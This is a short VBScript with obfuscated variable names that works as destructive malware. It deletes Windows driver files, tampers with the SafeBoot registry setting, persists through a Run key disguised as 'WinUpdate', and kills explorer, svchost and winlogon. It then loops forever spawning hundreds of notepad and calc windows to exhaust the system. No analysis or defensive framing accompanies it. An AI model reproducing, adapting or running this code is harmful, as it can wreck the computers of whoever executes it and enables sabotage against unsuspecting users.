Option Explicit
Dim x7p9q, q3z8k, k9m2v, r4t6y, f
f = WScript.ScriptFullName
Set x7p9q = CreateObject("WScript.Shell") 
Set q3z8k = CreateObject("Scripting.FileSystemObject") 

x7p9q.Run "cmd.exe /c " & WScript.ScriptFullName, 0, False

On Error Resume Next
q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") 
q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") 
On Error GoTo 0

Set k9m2v = CreateObject("WScript.Shell")
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD"

For r4t6y = 1 To 100
    x7p9q.Run "notepad.exe", 1, False 
Next

k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", WScript.ScriptFullName, "REG_SZ"
x7p9q.Run "taskkill /F /IM explorer.exe", 0, True 
x7p9q.Run "taskkill /F /IM svchost.exe", 0, True 
x7p9q.Run "taskkill /F /IM winlogon.exe", 0, True 

Do
    WScript.Sleep 3000 
    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
    For r4t6y = 1 To 500
        x7p9q.Run "notepad.exe", 1, False
        x7p9q.Run "calc.exe", 1, False
    Next
Loop
x7p9q.Run "powershell remove-item -path '" & f & "' -force", 0, False